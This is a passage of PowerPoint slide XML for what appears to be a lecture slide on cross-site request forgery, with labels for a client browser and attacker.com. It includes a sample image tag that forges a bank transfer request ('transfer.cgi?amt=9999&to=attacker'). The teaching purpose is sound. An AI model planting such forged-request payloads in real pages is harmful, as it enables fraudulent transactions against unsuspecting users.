                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80901" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80904" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80905" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80911" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="1588"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1588" b="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:cs typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>transfer.cgi?amt=9999&amp;to=attacker”&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="80912" name="object 26"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2196353" y="5104280"/>
            <a:ext cx="3308537" cy="1426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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
